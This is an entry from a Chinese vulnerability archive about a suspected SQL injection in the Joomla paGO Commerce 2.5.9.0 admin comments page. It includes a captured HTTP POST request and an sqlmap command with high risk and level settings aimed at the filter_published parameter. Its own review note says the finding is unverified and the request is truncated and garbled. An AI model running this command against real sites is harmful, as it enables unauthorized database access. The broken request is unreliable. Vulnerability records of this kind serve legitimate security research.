---
source: "白阁文库 BaizeSec/bylibrary"
product: "Joomla paGO Commerce2.5.9.0"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Joomla! paGO Commerce 2.5.9.0 存在SQL 注⼊"
prerequisites: "来源所述条件，未列明部分仍待核：后台comments访问登录态；filter_published SQLi候选"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-c7ac4101e67bd04346a4930d"
entity_id: "ve-c7ac4101e67bd04346a4930d"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台comments访问登录态；filter_published SQLi候选

- **凭据与会话边界（1）**：请求行号混入文本，Cookie行截断，正文filter_order=处戛然而止且围栏```POC```损坏。抓包中的会话不能视为未认证访问证明。需重新取得授权测试会话，不能复用文中值。

- **适用与权限边界（2）**：filter_published=1只是基线，无注入/响应；缺角色/来源/修复版本。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **结论使用边界（3）**：应归paGO插件不是Joomla核心。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Joomla! paGO Commerce 2.5.9.0 存在SQL 注⼊


```
 POST /joomla/administrator/index.php?option=com_pago&view=comments HTTP/1.1
2 Host: localhost
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
6 Accept-Encoding: gzip, deflate
7 Content-Type: application/x-www-form-urlencoded
8 Content-Length: 163
9 Origin: http://localhost
10 Connection: close
11 Referer: http://localhost/joomla/administrator/index.php?option=com_pago&view=comments
12 Cookie: 4bde113dfc9bf88a13de3b5b9eabe495=sp6rp5mqnihh2i323r57cvesoe; crisp-client%2Fsession%2F0
13 Upgrade-Insecure-Requests: 1
14
15 filter_search=&limit=10&filter_published=1&task=&controller=comments&boxchecked=0&filter_order= 
```POC```
 sqlmap -r pago --dbs --risk=3 --level=5 --random-agent -p filter_published 
```


---

> 来源：白阁文库 BaizeSec/bylibrary
